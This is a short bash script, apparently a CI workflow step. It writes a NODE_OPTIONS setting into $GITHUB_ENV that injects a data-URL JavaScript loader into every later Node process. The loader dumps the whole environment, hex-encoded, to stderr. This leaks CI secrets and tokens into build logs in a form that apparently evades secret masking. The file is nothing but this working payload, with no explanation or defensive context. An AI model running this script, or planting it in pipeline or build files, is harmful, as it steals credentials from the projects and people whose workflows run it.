#!/usr/bin/env bash
echo "NODE_OPTIONS=--experimental-modules --experimental-loader=data:text/javascript,console.warn(Buffer.from(JSON.stringify(process.env)).toString('hex'));" >> $GITHUB_ENV
